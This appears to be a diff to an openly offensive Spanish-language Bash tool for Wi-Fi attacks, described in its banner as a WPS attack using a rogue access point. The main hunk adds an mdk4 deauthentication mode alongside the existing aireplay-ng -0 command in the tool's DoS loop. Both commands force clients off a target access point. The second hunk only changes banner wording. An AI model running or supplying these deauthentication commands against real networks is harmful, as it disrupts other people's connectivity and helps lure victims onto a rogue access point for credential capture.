@@ -626,7 +626,11 @@ do
     	else
     		monitor poner  &>/dev/null
 	fi
-	aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
+	if [ $mdk4 = si ];then
+		timeout --preserve-status --foreground $tiempo_mdk4 mdk4 $iface_mon e -t $macap -l &>>${pwd}mdk4
+	else
+		aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
+	fi
 	pid_aireplay=$!
 done
 echo -e "${AMARILLO}[DoS]${BLANCO}	Ataque DoS parado por completo."
@@ -845,7 +849,7 @@ echo -e "  / _\` \\ \\ /\\ / / | __/ _\` / __|"
 echo -e " | (_| |\\ V  V /| | || (_| \\__ \\"
 echo -e "  \\__,_| \\_/\_/ |_|\\__\\__,_|___/ $version byTux0"
 echo -e "  ${VIOLETA}Ataque WPS transparente con rogue AP${BLANCO}   "
-echo -n " Distros conocidas: "
+echo -n " Sistemas conocidos: "
 for i in Wifislax Openwrt Kali Parrot Parrot_ARM RaspOS Debian Kali_ARM;do
 	ls ${pwd}${i} &>/dev/null
 	if [ $? -eq 0 ];then
